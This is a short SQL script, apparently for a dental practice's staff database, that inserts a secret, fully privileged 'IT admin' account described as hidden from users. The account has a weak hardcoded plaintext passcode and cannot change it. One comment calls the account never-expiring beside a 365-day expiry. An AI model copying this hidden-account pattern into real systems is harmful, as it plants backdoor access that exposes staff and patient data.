-- ADD IT ADMIN ACCOUNT (HIDDEN FROM USERS)
-- This creates a secret IT administrator account with maximum privileges

INSERT INTO staff_users (
  employee_number,
  full_name,
  email,
  passcode,
  role,
  position,
  specialization,
  is_dentist,
  is_owner,
  is_admin,
  permissions,
  commission_rates,
  is_active,
  passcode_expires_at,
  can_change_passcode,
  passcode_reset_required,
  hire_date,
  last_passcode_change,
  hourly_rate,
  created_at,
  updated_at
) VALUES (
  'IT001',
  'System Administrator',
  'it.admin@kreativdentalplus.com',
  'ADMIN2024',
  'it_admin',
  'IT Systems Manager',
  'System Administration',
  false,
  false,
  true,
  '{"all": true, "it_admin": true, "system_control": true, "database_access": true, "user_management": true, "audit_logs": true, "maintenance": true}',
  '{}',
  true,
  NOW() + INTERVAL '365 days', -- Never expires
  false, -- Cannot change own passcode (security)
  false,
  '2024-01-01',
  NOW(),
  0.00, -- No hourly rate
  NOW(),
  NOW()
);

-- Verify the IT admin account was created
SELECT
  'IT ADMIN ACCOUNT CREATED SUCCESSFULLY!' as status,
  employee_number,
  full_name,
  role,
  position,
  is_admin
FROM staff_users
WHERE employee_number = 'IT001';